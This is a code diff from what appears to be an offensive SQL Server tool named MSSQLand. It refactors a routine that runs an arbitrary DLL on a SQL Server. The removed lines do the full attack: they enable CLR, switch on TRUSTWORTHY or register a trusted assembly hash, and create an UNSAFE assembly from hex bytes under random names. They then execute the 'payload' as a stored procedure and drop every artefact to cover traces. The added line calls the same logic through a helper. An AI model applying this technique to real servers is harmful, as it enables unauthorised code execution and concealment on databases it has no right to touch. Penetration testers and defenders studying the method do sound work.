@@ -50,11 +50,6 @@ namespace MSSQLand.Actions.Execution
                 return;
             }
 
-            // Step 2: Enable CLR if not already enabled.
-            if (databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1) == false)
-            {
-                return;
-            }
 
             string libraryHash = library[0];
             string libraryHexString = library[1];
@@ -62,77 +57,14 @@ namespace MSSQLand.Actions.Execution
             Logger.Info($"SHA-512 Hash: {libraryHash}");
             Logger.Info($"DLL Bytes Length: {libraryHexString.Length}");
 
-            // Step 3: Generate random names for assembly and trusted hash path.
-            string assemblyDescription = Guid.NewGuid().ToString("N").Substring(0, 6);
-            string assem = Guid.NewGuid().ToString("N").Substring(0, 6);
 
-            // Step 4: Handle legacy SQL servers.
-            if (databaseContext.Server.Legacy)
-            {
-                Logger.Info("Turning on trustworthy property");
-                databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY ON;");
-            }
-            else
-            {
-                if (databaseContext.ConfigService.RegisterTrustedAssembly(libraryHash, assemblyDescription) == false)
-                {
-                    return;
-                }
-            }
-
-            
-            string dropProcedure = $"DROP PROCEDURE IF EXISTS [{_function}];";
-            string dropAssembly = $"DROP ASSEMBLY IF EXISTS [{assem}];";
-            string dropClrHash = $"EXEC sp_drop_trusted_assembly 0x{libraryHash};";
-
-            // Step 7: Drop existing procedure and assembly if they exist.
-            databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
-            databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
-
-            // Step 8: Create a new assembly from the DLL bytes.
-            databaseContext.QueryService.ExecuteNonProcessing($"CREATE ASSEMBLY [{assem}] FROM 0x{libraryHexString} WITH PERMISSION_SET = UNSAFE;");
-
-            if (!databaseContext.ConfigService.CheckAssembly(assem))
-            {
-                Logger.Error("Failed to create a new assembly");
-                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
-                databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
-                return;
-            }
-
-            Logger.Success($"DLL successfully loaded into assembly '{assem}'");
-
-            // Step 9: Create a new stored procedure linked to the assembly.
-            databaseContext.QueryService.ExecuteNonProcessing($"CREATE PROCEDURE [dbo].[{_function}] AS EXTERNAL NAME [{assem}].[StoredProcedures].[{_function}];");
-
-            if (!databaseContext.ConfigService.CheckProcedures(_function))
-            {
-                Logger.Error("Failed to load the DLL into a new stored procedure");
-                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
-                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
-                databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
-                return;
-            }
-
-            Logger.Success($"Stored procedure '{_function}' created successfully");
-
-            // Step 10: Execute the payload
-            databaseContext.QueryService.ExecuteNonProcessing($"EXEC {_function};");
-            Logger.Success("Function executed");
-
-            // Step 11: Cleanup - Drop procedure, assembly, and trusted hash.
-            databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
-            databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
-            databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
-
-            // Step 12: Reset TRUSTWORTHY property for legacy servers.
-            if (databaseContext.Server.Legacy)
-            {
-                Logger.Info("Turning off trustworthy property");
-                databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY OFF;");
-            }
-
-            Logger.Success("Cleanup completed");
+            databaseContext.ConfigService.DeployAndExecuteClrAssembly(
+                Guid.NewGuid().ToString("N").Substring(0, 6),
+                _function,
+                libraryHash,
+                Guid.NewGuid().ToString("N").Substring(0, 6),
+                library[1]
+            );
         }
 
 
